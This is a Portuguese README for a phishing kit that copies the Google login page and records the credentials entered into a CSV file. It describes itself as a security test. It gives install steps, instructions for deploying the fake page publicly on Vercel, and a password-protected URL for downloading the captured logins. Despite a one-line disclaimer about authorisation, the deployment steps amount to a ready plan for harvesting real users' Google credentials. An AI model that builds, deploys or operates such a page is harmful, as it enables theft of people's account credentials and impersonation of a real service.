# Teste de Segurança - Login Google

Sistema de teste de segurança que simula a tela de login do Google e salva as credenciais em CSV.

## Instalação

1. Instale as dependências:
```bash
npm install
```

## Como usar

1. Inicie o servidor:
```bash
npm start
```

2. Acesse no navegador:
```
http://localhost:3000
```

3. As credenciais serão salvas automaticamente no arquivo `credentials.csv`

## Estrutura

- `index.html` - Interface da tela de login
- `style.css` - Estilos CSS
- `script.js` - Lógica do frontend
- `server.js` - Servidor backend Node.js
- `credentials.csv` - Arquivo onde as credenciais são salvas (criado automaticamente)

## Deploy na Vercel

### Opção 1: Via CLI
```bash
# Instalar Vercel CLI
npm install -g vercel

# Fazer login
vercel login

# Deploy
vercel

# Deploy em produção
vercel --prod
```

### Opção 2: Via GitHub
1. Faça push do código para o GitHub
2. Acesse [vercel.com](https://vercel.com)
3. Importe o repositório
4. A Vercel detectará automaticamente as configurações

### Acessar o CSV

Na Vercel, o arquivo CSV é salvo em `/tmp`. Para baixar:

```
https://seu-projeto.vercel.app/api/download-csv?password=senha123
```

⚠️ **IMPORTANTE**: Configure uma senha segura usando variável de ambiente:
```bash
vercel env add DOWNLOAD_PASSWORD
```

Veja mais detalhes em `DEPLOY.md`

## Segurança

⚠️ Este é um sistema de teste de segurança. Use apenas em ambientes controlados e com autorização adequada.
